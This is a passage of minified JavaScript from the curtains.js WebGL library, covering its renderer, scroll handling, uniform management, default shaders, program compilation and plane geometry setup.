        for (let t = 0; t < this.shaderPasses.length; t++)
          this.shaderPasses[t]._canDraw && this.shaderPasses[t].resize();
        for (let t = 0; t < this.renderTargets.length; t++)
          this.renderTargets[t].resize();
        this.needRender();
      }
      clear() {
        this.gl.clear(this.gl.COLOR_BUFFER_BIT | this.gl.DEPTH_BUFFER_BIT);
      }
      clearDepth() {
        this.gl.clear(this.gl.DEPTH_BUFFER_BIT);
      }
      clearColor() {
        this.gl.clear(this.gl.COLOR_BUFFER_BIT);
      }
      bindFrameBuffer(t, e) {
        let r = null;
        t
          ? ((r = t.index),
            r !== this.state.frameBufferID &&
              (this.gl.bindFramebuffer(this.gl.FRAMEBUFFER, t._frameBuffer),
              this.gl.viewport(0, 0, t._size.width, t._size.height),
              t._shouldClear && !e && this.clear()))
          : null !== this.state.frameBufferID &&
            (this.gl.bindFramebuffer(this.gl.FRAMEBUFFER, null),
            this.gl.viewport(
              0,
              0,
              this.gl.drawingBufferWidth,
              this.gl.drawingBufferHeight
            )),
          (this.state.frameBufferID = r);
      }
      setDepth(t) {
        t && !this.state.depthTest
          ? ((this.state.depthTest = t), this.gl.enable(this.gl.DEPTH_TEST))
          : !t &&
            this.state.depthTest &&
            ((this.state.depthTest = t), this.gl.disable(this.gl.DEPTH_TEST));
      }
      setBlendFunc() {
        this.gl.enable(this.gl.BLEND),
          this.premultipliedAlpha
            ? this.gl.blendFuncSeparate(
                this.gl.ONE,
                this.gl.ONE_MINUS_SRC_ALPHA,
                this.gl.ONE,
                this.gl.ONE_MINUS_SRC_ALPHA
              )
            : this.gl.blendFuncSeparate(
                this.gl.SRC_ALPHA,
                this.gl.ONE_MINUS_SRC_ALPHA,
                this.gl.ONE,
                this.gl.ONE_MINUS_SRC_ALPHA
              );
      }
      setFaceCulling(t) {
        if (this.state.cullFace !== t)
          if (((this.state.cullFace = t), "none" === t))
            this.gl.disable(this.gl.CULL_FACE);
          else {
            const e = "front" === t ? this.gl.FRONT : this.gl.BACK;
            this.gl.enable(this.gl.CULL_FACE), this.gl.cullFace(e);
          }
      }
      useProgram(t) {
        (null !== this.state.currentProgramID &&
          this.state.currentProgramID === t.id) ||
          (this.gl.useProgram(t.program), (this.state.currentProgramID = t.id));
      }
      removePlane(t) {
        this.gl &&
          ((this.planes = this.planes.filter((e) => e.uuid !== t.uuid)),
          this.scene.removePlane(t),
          (t = null),
          this.gl && this.clear(),
          this.onSceneChange());
      }
      removeRenderTarget(t) {
        if (!this.gl) return;
        let e = this.planes.find(
          (e) =>
            "PingPongPlane" !== e.type && e.target && e.target.uuid === t.uuid
        );
        for (let e = 0; e < this.planes.length; e++)
          this.planes[e].target &&
            this.planes[e].target.uuid === t.uuid &&
            (this.planes[e].target = null);
        this.renderTargets = this.renderTargets.filter(
          (e) => e.uuid !== t.uuid
        );
        for (let t = 0; t < this.renderTargets.length; t++)
          this.renderTargets[t].index = t;
        (t = null),
          this.gl && this.clear(),
          e && this.scene.resetPlaneStacks(),
          this.onSceneChange();
      }
      removeShaderPass(t) {
        this.gl &&
          ((this.shaderPasses = this.shaderPasses.filter(
            (e) => e.uuid !== t.uuid
          )),
          this.scene.removeShaderPass(t),
          (t = null),
          this.gl && this.clear(),
          this.onSceneChange());
      }
      enableDrawing() {
        this.state.drawingEnabled = !0;
      }
      disableDrawing() {
        this.state.drawingEnabled = !1;
      }
      needRender() {
        this.state.forceRender = !0;
      }
      render() {
        this.gl &&
          (this.clear(),
          (this.state.currentGeometryID = null),
          this.scene.draw());
      }
      deletePrograms() {
        for (let t = 0; t < this.cache.programs.length; t++) {
          const e = this.cache.programs[t];
          this.gl.deleteProgram(e.program);
        }
      }
      dispose() {
        if (!this.gl) return;
        for (this.state.isActive = !1; this.planes.length > 0; )
          this.removePlane(this.planes[0]);
        for (; this.shaderPasses.length > 0; )
          this.removeShaderPass(this.shaderPasses[0]);
        for (; this.renderTargets.length > 0; )
          this.removeRenderTarget(this.renderTargets[0]);
        let t = this.nextRender.add(() => {
          0 === this.planes.length &&
            0 === this.shaderPasses.length &&
            0 === this.renderTargets.length &&
            ((t.keep = !1),
            this.deletePrograms(),
            this.clear(),
            this.canvas.removeEventListener(
              "webgllost",
              this._contextLostHandler,
              !1
            ),
            this.canvas.removeEventListener(
              "webglrestored",
              this._contextRestoredHandler,
              !1
            ),
            this.gl &&
              this.extensions.WEBGL_lose_context &&
              this.extensions.WEBGL_lose_context.loseContext(),
            (this.canvas.width = this.canvas.width),
            (this.gl = null),
            this.container.removeChild(this.canvas),
            (this.container = null),
            (this.canvas = null),
            this.onDisposed && this.onDisposed());
        }, !0);
      }
    }
    class L {
      constructor({
        xOffset: t = 0,
        yOffset: e = 0,
        lastXDelta: r = 0,
        lastYDelta: i = 0,
        shouldWatch: n = !0,
        onScroll: s = () => {},
      } = {}) {
        (this.xOffset = t),
          (this.yOffset = e),
          (this.lastXDelta = r),
          (this.lastYDelta = i),
          (this.shouldWatch = n),
          (this.onScroll = s),
          (this.handler = this.scroll.bind(this, !0)),
          this.shouldWatch &&
            window.addEventListener("scroll", this.handler, { passive: !0 });
      }
      scroll() {
        this.updateScrollValues(window.pageXOffset, window.pageYOffset);
      }
      updateScrollValues(t, e) {
        const r = this.xOffset;
        (this.xOffset = t), (this.lastXDelta = r - this.xOffset);
        const i = this.yOffset;
        (this.yOffset = e),
          (this.lastYDelta = i - this.yOffset),
          this.onScroll && this.onScroll(this.lastXDelta, this.lastYDelta);
      }
      dispose() {
        this.shouldWatch &&
          window.removeEventListener("scroll", this.handler, { passive: !0 });
      }
    }
    class B {
      constructor({
        container: t,
        alpha: e = !0,
        premultipliedAlpha: r = !1,
        antialias: i = !0,
        depth: n = !0,
        failIfMajorPerformanceCaveat: s = !0,
        preserveDrawingBuffer: o = !1,
        stencil: a = !1,
        autoResize: l = !0,
        autoRender: h = !0,
        watchScroll: u = !0,
        pixelRatio: c = window.devicePixelRatio || 1,
        renderingScale: d = 1,
        production: p = !1,
      } = {}) {
        (this.type = "Curtains"),
          (this._autoResize = l),
          (this._autoRender = h),
          (this._watchScroll = u),
          (this.pixelRatio = c),
          (d = isNaN(d) ? 1 : parseFloat(d)),
          (this._renderingScale = Math.max(0.25, Math.min(1, d))),
          (this.premultipliedAlpha = r),
          (this.alpha = e),
          (this.antialias = i),
          (this.depth = n),
          (this.failIfMajorPerformanceCaveat = s),
          (this.preserveDrawingBuffer = o),
          (this.stencil = a),
          (this.production = p),
          (this.errors = !1),
          t
            ? this.setContainer(t)
            : this.production ||
              C(
                this.type +
                  ": no container provided in the initial parameters. Use setContainer() method to set one later and initialize the WebGL context"
              );
      }
      setContainer(t) {
        if (t)
          if ("string" == typeof t)
            if ((t = document.getElementById(t))) this.container = t;
            else {
              let t = document.createElement("div");
              t.setAttribute("id", "curtains-canvas"),
                document.body.appendChild(t),
                (this.container = t),
                this.production ||
                  C(
                    'Curtains: no valid container HTML element or ID provided, created a div with "curtains-canvas" ID instead'
                  );
            }
          else t instanceof Element && (this.container = t);
        else {
          let t = document.createElement("div");
          t.setAttribute("id", "curtains-canvas"),
            document.body.appendChild(t),
            (this.container = t),
            this.production ||
              C(
                'Curtains: no valid container HTML element or ID provided, created a div with "curtains-canvas" ID instead'
              );
        }
        this._initCurtains();
      }
      _initCurtains() {
        (this.planes = []),
          (this.renderTargets = []),
          (this.shaderPasses = []),
          this._initRenderer(),
          this.gl &&
            (this._initScroll(),
            this._setSize(),
            this._addListeners(),
            this.container.appendChild(this.canvas),
            console.log("curtains.js - v7.3"),
            (this._animationFrameID = null),
            this._autoRender && this._animate());
      }
      _initRenderer() {
        (this.renderer = new k({
          alpha: this.alpha,
          antialias: this.antialias,
          premultipliedAlpha: this.premultipliedAlpha,
          depth: this.depth,
          failIfMajorPerformanceCaveat: this.failIfMajorPerformanceCaveat,
          preserveDrawingBuffer: this.preserveDrawingBuffer,
          stencil: this.stencil,
          container: this.container,
          pixelRatio: this.pixelRatio,
          renderingScale: this._renderingScale,
          production: this.production,
          onError: () => this._onRendererError(),
          onContextLost: () => this._onRendererContextLost(),
          onContextRestored: () => this._onRendererContextRestored(),
          onDisposed: () => this._onRendererDisposed(),
          onSceneChange: () => this._keepSync(),
        })),
          (this.gl = this.renderer.gl),
          (this.canvas = this.renderer.canvas);
      }
      restoreContext() {
        this.renderer.restoreContext();
      }
      _animate() {
        this.render(),
          (this._animationFrameID = window.requestAnimationFrame(
            this._animate.bind(this)
          ));
      }
      enableDrawing() {
        this.renderer.enableDrawing();
      }
      disableDrawing() {
        this.renderer.disableDrawing();
      }
      needRender() {
        this.renderer.needRender();
      }
      nextRender(t) {
        this.renderer.nextRender.add(t);
      }
      clear() {
        this.renderer && this.renderer.clear();
      }
      clearDepth() {
        this.renderer && this.renderer.clearDepth();
      }
      clearColor() {
        this.renderer && this.renderer.clearColor();
      }
      isWebGL2() {
        return !!this.gl && this.renderer._isWebGL2;
      }
      render() {
        this.renderer.nextRender.execute(),
          (this.renderer.state.drawingEnabled ||
            this.renderer.state.forceRender) &&
            (this.renderer.state.forceRender &&
              (this.renderer.state.forceRender = !1),
            this._onRenderCallback && this._onRenderCallback(),
            this.renderer.render());
      }
      _addListeners() {
        (this._resizeHandler = null),
          this._autoResize &&
            ((this._resizeHandler = this.resize.bind(this, !0)),
            window.addEventListener("resize", this._resizeHandler, !1));
      }
      setPixelRatio(t, e) {
        (this.pixelRatio = parseFloat(Math.max(t, 1)) || 1),
          this.renderer.setPixelRatio(t),
          this.resize(e);
      }
      _setSize() {
        this.renderer.setSize(),
          this._scrollManager.shouldWatch &&
            ((this._scrollManager.xOffset = window.pageXOffset),
            (this._scrollManager.yOffset = window.pageYOffset));
      }
      getBoundingRect() {
        return this.renderer._boundingRect;
      }
      resize(t) {
        this.gl &&
          (this._setSize(),
          this.renderer.resize(),
          this.nextRender(() => {
            this._onAfterResizeCallback && t && this._onAfterResizeCallback();
          }));
      }
      _initScroll() {
        this._scrollManager = new L({
          xOffset: window.pageXOffset,
          yOffset: window.pageYOffset,
          lastXDelta: 0,
          lastYDelta: 0,
          shouldWatch: this._watchScroll,
          onScroll: (t, e) => this._updateScroll(t, e),
        });
      }
      _updateScroll(t, e) {
        for (let r = 0; r < this.planes.length; r++)
          this.planes[r].watchScroll &&
            this.planes[r].updateScrollPosition(t, e);
        this.renderer.needRender(),
          this._onScrollCallback && this._onScrollCallback();
      }
      updateScrollValues(t, e) {
        this._scrollManager.updateScrollValues(t, e);
      }
      getScrollDeltas() {
        return {
          x: this._scrollManager.lastXDelta,
          y: this._scrollManager.lastYDelta,
        };
      }
      getScrollValues() {
        return {
          x: this._scrollManager.xOffset,
          y: this._scrollManager.yOffset,
        };
      }
      _keepSync() {
        (this.planes = this.renderer.planes),
          (this.shaderPasses = this.renderer.shaderPasses),
          (this.renderTargets = this.renderer.renderTargets);
      }
      lerp(t, e, r) {
        return (function (t, e, r) {
          return (1 - r) * t + r * e;
        })(t, e, r);
      }
      onAfterResize(t) {
        return t && (this._onAfterResizeCallback = t), this;
      }
      onError(t) {
        return t && (this._onErrorCallback = t), this;
      }
      _onRendererError() {
        setTimeout(() => {
          this._onErrorCallback && !this.errors && this._onErrorCallback(),
            (this.errors = !0);
        }, 0);
      }
      onContextLost(t) {
        return t && (this._onContextLostCallback = t), this;
      }
      _onRendererContextLost() {
        this._onContextLostCallback && this._onContextLostCallback();
      }
      onContextRestored(t) {
        return t && (this._onContextRestoredCallback = t), this;
      }
      _onRendererContextRestored() {
        this._onContextRestoredCallback && this._onContextRestoredCallback();
      }
      onRender(t) {
        return t && (this._onRenderCallback = t), this;
      }
      onScroll(t) {
        return t && (this._onScrollCallback = t), this;
      }
      dispose() {
        this.renderer.dispose();
      }
      _onRendererDisposed() {
        this._animationFrameID &&
          window.cancelAnimationFrame(this._animationFrameID),
          this._resizeHandler &&
            window.removeEventListener("resize", this._resizeHandler, !1),
          this._scrollManager && this._scrollManager.dispose();
      }
    }
    class z {
      constructor(t, e, r, i) {
        if (
          ((this.type = "Uniforms"),
          t && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = t.gl),
          (this.program = e),
          (this.shared = r),
          (this.uniforms = {}),
          i)
        )
          for (const t in i) {
            const e = i[t];
            this.uniforms[t] = {
              name: e.name,
              type: e.type,
              value:
                e.value.clone && "function" == typeof e.value.clone
                  ? e.value.clone()
                  : e.value,
              update: null,
            };
          }
      }
      handleUniformSetting(t) {
        switch (t.type) {
          case "1i":
            t.update = this.setUniform1i.bind(this);
            break;
          case "1iv":
            t.update = this.setUniform1iv.bind(this);
            break;
          case "1f":
            t.update = this.setUniform1f.bind(this);
            break;
          case "1fv":
            t.update = this.setUniform1fv.bind(this);
            break;
          case "2i":
            t.update = this.setUniform2i.bind(this);
            break;
          case "2iv":
            t.update = this.setUniform2iv.bind(this);
            break;
          case "2f":
            t.update = this.setUniform2f.bind(this);
            break;
          case "2fv":
            t.update = this.setUniform2fv.bind(this);
            break;
          case "3i":
            t.update = this.setUniform3i.bind(this);
            break;
          case "3iv":
            t.update = this.setUniform3iv.bind(this);
            break;
          case "3f":
            t.update = this.setUniform3f.bind(this);
            break;
          case "3fv":
            t.update = this.setUniform3fv.bind(this);
            break;
          case "4i":
            t.update = this.setUniform4i.bind(this);
            break;
          case "4iv":
            t.update = this.setUniform4iv.bind(this);
            break;
          case "4f":
            t.update = this.setUniform4f.bind(this);
            break;
          case "4fv":
            t.update = this.setUniform4fv.bind(this);
            break;
          case "mat2":
            t.update = this.setUniformMatrix2fv.bind(this);
            break;
          case "mat3":
            t.update = this.setUniformMatrix3fv.bind(this);
            break;
          case "mat4":
            t.update = this.setUniformMatrix4fv.bind(this);
            break;
          default:
            this.renderer.production ||
              C(this.type + ": This uniform type is not handled : ", t.type);
        }
      }
      setInternalFormat(t) {
        "Vec2" === t.value.type
          ? ((t._internalFormat = "Vec2"), (t.lastValue = t.value.clone()))
          : "Vec3" === t.value.type
          ? ((t._internalFormat = "Vec3"), (t.lastValue = t.value.clone()))
          : "Mat4" === t.value.type
          ? ((t._internalFormat = "Mat4"), (t.lastValue = t.value.clone()))
          : "Quat" === t.value.type
          ? ((t._internalFormat = "Quat"), (t.lastValue = t.value.clone()))
          : Array.isArray(t.value)
          ? ((t._internalFormat = "array"), (t.lastValue = Array.from(t.value)))
          : t.value.constructor === Float32Array
          ? ((t._internalFormat = "mat"), (t.lastValue = t.value))
          : ((t._internalFormat = "float"), (t.lastValue = t.value));
      }
      setUniforms() {
        if (this.uniforms)
          for (const t in this.uniforms) {
            let e = this.uniforms[t];
            (e.location = this.gl.getUniformLocation(this.program, e.name)),
              e._internalFormat || this.setInternalFormat(e),
              e.type ||
                ("Vec2" === e._internalFormat
                  ? (e.type = "2f")
                  : "Vec3" === e._internalFormat
                  ? (e.type = "3f")
                  : "Mat4" === e._internalFormat
                  ? (e.type = "mat4")
                  : "array" === e._internalFormat
                  ? 4 === e.value.length
                    ? ((e.type = "4f"),
                      this.renderer.production ||
                        C(
                          this.type +
                            ": No uniform type declared for " +
                            e.name +
                            ", applied a 4f (array of 4 floats) uniform type"
                        ))
                    : 3 === e.value.length
                    ? ((e.type = "3f"),
                      this.renderer.production ||
                        C(
                          this.type +
                            ": No uniform type declared for " +
                            e.name +
                            ", applied a 3f (array of 3 floats) uniform type"
                        ))
                    : 2 === e.value.length &&
                      ((e.type = "2f"),
                      this.renderer.production ||
                        C(
                          this.type +
                            ": No uniform type declared for " +
                            e.name +
                            ", applied a 2f (array of 2 floats) uniform type"
                        ))
                  : "mat" === e._internalFormat
                  ? 16 === e.value.length
                    ? ((e.type = "mat4"),
                      this.renderer.production ||
                        C(
                          this.type +
                            ": No uniform type declared for " +
                            e.name +
                            ", applied a mat4 (4x4 matrix array) uniform type"
                        ))
                    : 9 === e.value.length
                    ? ((e.type = "mat3"),
                      this.renderer.production ||
                        C(
                          this.type +
                            ": No uniform type declared for " +
                            e.name +
                            ", applied a mat3 (3x3 matrix array) uniform type"
                        ))
                    : 4 === e.value.length &&
                      ((e.type = "mat2"),
                      this.renderer.production ||
                        C(
                          this.type +
                            ": No uniform type declared for " +
                            e.name +
                            ", applied a mat2 (2x2 matrix array) uniform type"
                        ))
                  : ((e.type = "1f"),
                    this.renderer.production ||
                      C(
                        this.type +
                          ": No uniform type declared for " +
                          e.name +
                          ", applied a 1f (float) uniform type"
                      ))),
              this.handleUniformSetting(e),
              e.update && e.update(e);
          }
      }
      updateUniforms() {
        if (this.uniforms)
          for (const t in this.uniforms) {
            const e = this.uniforms[t];
            let r = !1;
            this.shared
              ? (r = !0)
              : "Vec2" === e._internalFormat ||
                "Vec3" === e._internalFormat ||
                "Quat" === e._internalFormat
              ? e.value.equals(e.lastValue) ||
                ((r = !0), e.lastValue.copy(e.value))
              : e.value.length
              ? JSON.stringify(e.value) !== JSON.stringify(e.lastValue) &&
                ((r = !0), (e.lastValue = Array.from(e.value)))
              : e.value !== e.lastValue && ((r = !0), (e.lastValue = e.value)),
              r && e.update && e.update(e);
          }
      }
      setUniform1i(t) {
        this.gl.uniform1i(t.location, t.value);
      }
      setUniform1iv(t) {
        this.gl.uniform1iv(t.location, t.value);
      }
      setUniform1f(t) {
        this.gl.uniform1f(t.location, t.value);
      }
      setUniform1fv(t) {
        this.gl.uniform1fv(t.location, t.value);
      }
      setUniform2i(t) {
        "Vec2" === t._internalFormat
          ? this.gl.uniform2i(t.location, t.value.x, t.value.y)
          : this.gl.uniform2i(t.location, t.value[0], t.value[1]);
      }
      setUniform2iv(t) {
        "Vec2" === t._internalFormat
          ? this.gl.uniform2iv(t.location, [t.value.x, t.value.y])
          : this.gl.uniform2iv(t.location, t.value);
      }
      setUniform2f(t) {
        "Vec2" === t._internalFormat
          ? this.gl.uniform2f(t.location, t.value.x, t.value.y)
          : this.gl.uniform2f(t.location, t.value[0], t.value[1]);
      }
      setUniform2fv(t) {
        "Vec2" === t._internalFormat
          ? this.gl.uniform2fv(t.location, [t.value.x, t.value.y])
          : this.gl.uniform2fv(t.location, t.value);
      }
      setUniform3i(t) {
        "Vec3" === t._internalFormat
          ? this.gl.uniform3i(t.location, t.value.x, t.value.y, t.value.z)
          : this.gl.uniform3i(t.location, t.value[0], t.value[1], t.value[2]);
      }
      setUniform3iv(t) {
        "Vec3" === t._internalFormat
          ? this.gl.uniform3iv(t.location, [t.value.x, t.value.y, t.value.z])
          : this.gl.uniform3iv(t.location, t.value);
      }
      setUniform3f(t) {
        "Vec3" === t._internalFormat
          ? this.gl.uniform3f(t.location, t.value.x, t.value.y, t.value.z)
          : this.gl.uniform3f(t.location, t.value[0], t.value[1], t.value[2]);
      }
      setUniform3fv(t) {
        "Vec3" === t._internalFormat
          ? this.gl.uniform3fv(t.location, [t.value.x, t.value.y, t.value.z])
          : this.gl.uniform3fv(t.location, t.value);
      }
      setUniform4i(t) {
        "Quat" === t._internalFormat
          ? this.gl.uniform4i(
              t.location,
              t.value.elements[0],
              t.value.elements[1],
              t.value.elements[2],
              t.value[3]
            )
          : this.gl.uniform4i(
              t.location,
              t.value[0],
              t.value[1],
              t.value[2],
              t.value[3]
            );
      }
      setUniform4iv(t) {
        "Quat" === t._internalFormat
          ? this.gl.uniform4iv(t.location, [
              t.value.elements[0],
              t.value.elements[1],
              t.value.elements[2],
              t.value[3],
            ])
          : this.gl.uniform4iv(t.location, t.value);
      }
      setUniform4f(t) {
        "Quat" === t._internalFormat
          ? this.gl.uniform4f(
              t.location,
              t.value.elements[0],
              t.value.elements[1],
              t.value.elements[2],
              t.value[3]
            )
          : this.gl.uniform4f(
              t.location,
              t.value[0],
              t.value[1],
              t.value[2],
              t.value[3]
            );
      }
      setUniform4fv(t) {
        "Quat" === t._internalFormat
          ? this.gl.uniform4fv(t.location, [
              t.value.elements[0],
              t.value.elements[1],
              t.value.elements[2],
              t.value[3],
            ])
          : this.gl.uniform4fv(t.location, t.value);
      }
      setUniformMatrix2fv(t) {
        this.gl.uniformMatrix2fv(t.location, !1, t.value);
      }
      setUniformMatrix3fv(t) {
        this.gl.uniformMatrix3fv(t.location, !1, t.value);
      }
      setUniformMatrix4fv(t) {
        "Mat4" === t._internalFormat
          ? this.gl.uniformMatrix4fv(t.location, !1, t.value.elements)
          : this.gl.uniformMatrix4fv(t.location, !1, t.value);
      }
    }
    var I = "\nprecision mediump float;\n".replace(/\n/g, ""),
      j =
        "\nattribute vec3 aVertexPosition;\nattribute vec2 aTextureCoord;\n".replace(
          /\n/g,
          ""
        ),
      V =
        "\nvarying vec3 vVertexPosition;\nvarying vec2 vTextureCoord;\n".replace(
          /\n/g,
          ""
        ),
      N = (
        I +
        j +
        V +
        "\nuniform mat4 uMVMatrix;\nuniform mat4 uPMatrix;\n\nvoid main() {\n    vTextureCoord = aTextureCoord;\n    vVertexPosition = aVertexPosition;\n    \n    gl_Position = uPMatrix * uMVMatrix * vec4(aVertexPosition, 1.0);\n}\n"
      ).replace(/\n/g, ""),
      U = (
        I +
        V +
        "\nvoid main() {\n    gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);\n}\n"
      ).replace(/\n/g, ""),
      W = (
        I +
        j +
        V +
        "\nvoid main() {\n    vTextureCoord = aTextureCoord;\n    vVertexPosition = aVertexPosition;\n    \n    gl_Position = vec4(aVertexPosition, 1.0);\n}\n"
      ).replace(/\n/g, ""),
      H = (
        I +
        V +
        "\nuniform sampler2D uRenderTexture;\n\nvoid main() {\n    gl_FragColor = texture2D(uRenderTexture, vTextureCoord);\n}\n"
      ).replace(/\n/g, "");
    class q {
      constructor(t, { parent: e, vertexShader: r, fragmentShader: i } = {}) {
        (this.type = "Program"),
          t && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = this.renderer.gl),
          (this.parent = e),
          (this.defaultVsCode = "Plane" === this.parent.type ? N : W),
          (this.defaultFsCode = "Plane" === this.parent.type ? U : H),
          r
            ? (this.vsCode = r)
            : (this.renderer.production ||
                "Plane" !== this.parent.type ||
                C(
                  this.parent.type +
                    ": No vertex shader provided, will use a default one"
                ),
              (this.vsCode = this.defaultVsCode)),
          i
            ? (this.fsCode = i)
            : (this.renderer.production ||
                C(
                  this.parent.type +
                    ": No fragment shader provided, will use a default one"
                ),
              (this.fsCode = this.defaultFsCode)),
          (this.compiled = !0),
          this.setupProgram();
      }
      createShader(t, e) {
        const r = this.gl.createShader(e);
        if (
          (this.gl.shaderSource(r, t),
          this.gl.compileShader(r),
          !this.renderer.production &&
            !this.gl.getShaderParameter(r, this.gl.COMPILE_STATUS))
        ) {
          const t =
            e === this.gl.VERTEX_SHADER ? "vertex shader" : "fragment shader";
          let i = this.gl.getShaderSource(r).split("\n");
          for (let t = 0; t < i.length; t++) i[t] = t + 1 + ": " + i[t];
          return (
            (i = i.join("\n")),
            C(
              this.type + ": Errors occurred while compiling the",
              t,
              ":\n",
              this.gl.getShaderInfoLog(r)
            ),
            P(i),
            C(this.type + ": Will use a default", t),
            this.createShader(
              e === this.gl.VERTEX_SHADER
                ? this.defaultVsCode
                : this.defaultFsCode,
              e
            )
          );
        }
        return r;
      }
      useNewShaders() {
        (this.vertexShader = this.createShader(
          this.vsCode,
          this.gl.VERTEX_SHADER
        )),
          (this.fragmentShader = this.createShader(
            this.fsCode,
            this.gl.FRAGMENT_SHADER
          )),
          (this.vertexShader && this.fragmentShader) ||
            this.renderer.production ||
            C(
              this.type +
                ": Unable to find or compile the vertex or fragment shader"
            );
      }
      setupProgram() {
        let t = this.renderer.cache.getProgramFromShaders(
          this.vsCode,
          this.fsCode
        );
        t
          ? this.parent.shareProgram
            ? ((this.shared = !0),
              (this.vertexShader = t.vertexShader),
              (this.fragmentShader = t.fragmentShader),
              (this.program = t.program),
              (this.id = t.id),
              (this.activeTextures = t.activeTextures))
            : ((this.vertexShader = t.vertexShader),
              (this.fragmentShader = t.fragmentShader),
              (this.activeTextures = t.activeTextures),
              this.createProgram())
          : (this.useNewShaders(), this.compiled && this.createProgram());
      }
      createProgram() {
        if (
          ((this.id = this.renderer.cache.programs.length),
          (this.shared = this.parent.shareProgram),
          (this.program = this.gl.createProgram()),
          this.gl.attachShader(this.program, this.vertexShader),
          this.gl.attachShader(this.program, this.fragmentShader),
          this.gl.linkProgram(this.program),
          !this.renderer.production &&
            !this.gl.getProgramParameter(this.program, this.gl.LINK_STATUS))
        )
          return (
            C(
              this.type +
                ": Unable to initialize the shader program: " +
                this.gl.getProgramInfoLog(this.program)
            ),
            C(this.type + ": Will use default vertex and fragment shaders"),
            (this.vertexShader = this.createShader(
              this.defaultVsCode,
              this.gl.VERTEX_SHADER
            )),
            (this.fragmentShader = this.createShader(
              this.defaultFsCode,
              this.gl.FRAGMENT_SHADER
            )),
            void this.createProgram()
          );
        if (
          (this.gl.deleteShader(this.vertexShader),
          this.gl.deleteShader(this.fragmentShader),
          !this.activeTextures)
        ) {
          this.activeTextures = [];
          let t = this.gl.getProgramParameter(
            this.program,
            this.gl.ACTIVE_UNIFORMS
          );
          for (let e = 0; e < t; e++) {
            const t = this.gl.getActiveUniform(this.program, e);
            t.type === this.gl.SAMPLER_2D && this.activeTextures.push(t.name);
          }
        }
        this.renderer.cache.addProgram(this);
      }
      createUniforms(t) {
        (this.uniformsManager = new z(
          this.renderer,
          this.program,
          this.shared,
          t
        )),
          this.setUniforms();
      }
      setUniforms() {
        this.renderer.useProgram(this), this.uniformsManager.setUniforms();
      }
      updateUniforms() {
        this.renderer.useProgram(this), this.uniformsManager.updateUniforms();
      }
    }
    class X {
      constructor(t, { program: e = null, width: r = 1, height: i = 1 } = {}) {
        (this.type = "Geometry"),
          t && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = this.renderer.gl),
          (this.definition = { id: r * i + r, width: r, height: i }),
          this.setDefaultAttributes(),
          this.setVerticesUVs();
      }
      restoreContext(t) {
        (this.program = null),
          this.setDefaultAttributes(),
          this.setVerticesUVs(),
          this.setProgram(t);
      }
      setDefaultAttributes() {
        this.attributes = {
          vertexPosition: { name: "aVertexPosition", size: 3 },
          textureCoord: { name: "aTextureCoord", size: 3 },
        };
      }
      setVerticesUVs() {
        const t = this.renderer.cache.getGeometryFromID(this.definition.id);
        t
          ? ((this.attributes.vertexPosition.array = t.vertices),
            (this.attributes.textureCoord.array = t.uvs))
          : (this.computeVerticesUVs(),
            this.renderer.cache.addGeometry(
              this.definition.id,
              this.attributes.vertexPosition.array,
              this.attributes.textureCoord.array
            ));
      }
      setProgram(t) {
        (this.program = t.program),
          this.initAttributes(),
          this.renderer._isWebGL2
            ? ((this._vao = this.gl.createVertexArray()),
              this.gl.bindVertexArray(this._vao))
            : this.renderer.extensions.OES_vertex_array_object &&
              ((this._vao =
                this.renderer.extensions.OES_vertex_array_object.createVertexArrayOES()),
              this.renderer.extensions.OES_vertex_array_object.bindVertexArrayOES(
                this._vao
              )),
          this.initializeBuffers();
      }
      initAttributes() {
        for (const t in this.attributes)
          (this.attributes[t].location = this.gl.getAttribLocation(
            this.program,
            this.attributes[t].name
          )),
            (this.attributes[t].buffer = this.gl.createBuffer()),
            (this.attributes[t].numberOfItems =
              this.definition.width *
              this.definition.height *
              this.attributes[t].size *
              2);
      }
      computeVerticesUVs() {
        (this.attributes.vertexPosition.array = []),
          (this.attributes.textureCoord.array = []);
        const t = this.attributes.vertexPosition.array,
          e = this.attributes.textureCoord.array;
        for (let r = 0; r < this.definition.height; r++) {
          const i = r / this.definition.height;
          for (let r = 0; r < this.definition.width; r++) {
            const n = r / this.definition.width;
            e.push(n),
              e.push(i),
              e.push(0),
              t.push(2 * (n - 0.5)),
              t.push(2 * (i - 0.5)),
              t.push(0),
              e.push(n + 1 / this.definition.width),
              e.push(i),
              e.push(0),
              t.push(2 * (n + 1 / this.definition.width - 0.5)),
              t.push(2 * (i - 0.5)),
              t.push(0),
              e.push(n),
              e.push(i + 1 / this.definition.height),
              e.push(0),
              t.push(2 * (n - 0.5)),
              t.push(2 * (i + 1 / this.definition.height - 0.5)),
              t.push(0),
              e.push(n),
              e.push(i + 1 / this.definition.height),
              e.push(0),
              t.push(2 * (n - 0.5)),
              t.push(2 * (i + 1 / this.definition.height - 0.5)),
              t.push(0),
              e.push(n + 1 / this.definition.width),
              e.push(i),
              e.push(0),
              t.push(2 * (n + 1 / this.definition.width - 0.5)),
              t.push(2 * (i - 0.5)),
              t.push(0),
              e.push(n + 1 / this.definition.width),
              e.push(i + 1 / this.definition.height),
              e.push(0),
              t.push(2 * (n + 1 / this.definition.width - 0.5)),
              t.push(2 * (i + 1 / this.definition.height - 0.5)),
              t.push(0);
          }
        }
      }
      initializeBuffers() {
        if (this.attributes) {
          for (const t in this.attributes)
            this.gl.enableVertexAttribArray(this.attributes[t].location),
              this.gl.bindBuffer(
                this.gl.ARRAY_BUFFER,
                this.attributes[t].buffer
              ),
              this.gl.bufferData(
                this.gl.ARRAY_BUFFER,
                new Float32Array(this.attributes[t].array),
                this.gl.STATIC_DRAW
              ),
              this.gl.vertexAttribPointer(
                this.attributes[t].location,
                this.attributes[t].size,
                this.gl.FLOAT,
                !1,
                0,
                0
              );
          this.renderer.state.currentGeometryID = this.definition.id;
        }
      }
      bindBuffers() {
        if (this._vao)
          this.renderer._isWebGL2
            ? this.gl.bindVertexArray(this._vao)
            : this.renderer.extensions.OES_vertex_array_object.bindVertexArrayOES(
                this._vao
              );
        else
          for (const t in this.attributes)
            this.gl.enableVertexAttribArray(this.attributes[t].location),
              this.gl.bindBuffer(
